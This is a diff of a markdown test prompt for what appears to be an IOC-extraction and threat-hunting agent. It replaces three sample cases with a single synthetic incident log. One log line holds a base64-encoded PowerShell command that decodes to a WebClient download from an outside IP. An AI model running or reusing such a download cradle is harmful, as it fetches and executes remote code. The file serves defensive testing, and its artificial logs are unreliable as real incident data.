@@ -1,39 +1,29 @@
 ## Sample Prompt Used to Test the Agent
 
-I need you to analyze three different pieces of intelligence I've collected. Can you extract the IOCs and provide hunting queries for each?
+URGENT - Security Incident Analysis Required
 
-**Case 1:** Found this list in a threat report, need IOCs extracted:
-192.168.1.100
-malware-c2.example.com
-http://phishing-site.net/login
-d41d8cd98f00b204e9800998ecf8427e
-bitcoin:1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Malware
+We just detected suspicious activity on our network and need immediate IOC extraction and analysis. Here's what we found in our initial investigation:
 
-**Case 2:** Suspicious activity from our SIEM logs today:
-2024-03-06 14:23:15 DNS Query: suspicious-domain.tk A record requested by 10.0.0.45
-2024-03-06 14:23:18 HTTP Connection: 10.0.0.45 -> 185.220.101.42:443 (SSL/TLS)
-2024-03-06 14:23:22 File Created: C:\Users\john\AppData\Temp\update.exe (SHA256: 7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730)
-2024-03-06 14:23:25 Registry Modified: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate
-2024-03-06 14:23:30 Network Connection: update.exe -> 203.0.113.45:8080
+[2024-03-06 14:23:15] Firewall Alert: Outbound connection blocked to 185.220.101.42 on port 443
+[2024-03-06 14:23:18] DNS Query: workstation-045 queried update-service-ms.com
+[2024-03-06 14:23:22] Process execution: powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAcwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAuADEAMAAxAC4ANAA
+[2024-03-06 14:23:25] File created: C:\Users\jsmith\AppData\Local\Temp\update.exe
+[2024-03-06 14:23:26] Hash detected: SHA256 - 7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730
+[2024-03-06 14:23:30] Network connection: update.exe contacted cdn-updates.azurewebsites.net
+[2024-03-06 14:23:35] Registry modification: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate
+[2024-03-06 14:24:01] Email sent from: security-team@company-updates.org to multiple internal recipients
+[2024-03-06 14:24:15] Additional DNS queries: backup-service.company-updates.org, mail-relay.company-updates.org
+[2024-03-06 14:24:22] Suspicious file hash found: MD5 - a1b2c3d4e5f6789012345678901234ab
+[2024-03-06 14:24:30] HTTP POST to: https://data-collection.company-updates.org/api/submit
+Context: This appears to be a targeted attack on our finance department. User jsmith clicked on what looked like a legitimate software update email. We need to understand the full scope of compromise and get hunting queries ready for our Splunk environment.
 
-**Case 3:** Major incident we're investigating - need full analysis:
-INCIDENT REPORT: Breach Investigation - Finance Department
+What we need:
 
-Timeline:
-- 2024-02-28 09:15: Employee received email with attachment "Invoice_Q1_2024.docx" 
-- 2024-02-28 09:22: Malicious macro executed, dropped payload (SHA256: a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456)
-- 2024-02-28 09:25: Scheduled task created "SystemHealthCheck"
-- 2024-02-28 09:30: Outbound connection to 203.0.113.45:443 (SSL encrypted)
-- 2024-03-01 02:00: WMI activity targeting DC01.finance.corp (10.0.1.10)
-- 2024-03-01 02:15: lsass.exe memory access detected
-- 2024-03-05 03:00: Large files moved to C:\Windows\Temp\backup\
-- 2024-03-05 03:30: Encrypted traffic to backup-server.darkweb.onion
-- 2024-03-06 01:00: New domains observed: staging1.malicious-infra.com, staging2.malicious-infra.com
+Extract all IOCs from this incident data
+Analyze threat level and potential attribution
+Map this to attack techniques so we understand what happened
+Generate Splunk queries to hunt for similar activity across our network
+Recommendations for immediate containment actions
+Environment details: We're running Splunk Enterprise with standard Windows event logs, firewall logs, and DNS logs. Our main concern is lateral movement and data exfiltration.
 
-Observed techniques:
-- PowerShell execution with encoded commands
-- WMI lateral movement
-- Process hollowing and DLL side-loading
-- 3-week persistence before detection
-- Matches patterns we've seen from state-sponsored groups
+Please analyze this incident and provide a comprehensive assessment with actionable intelligence.
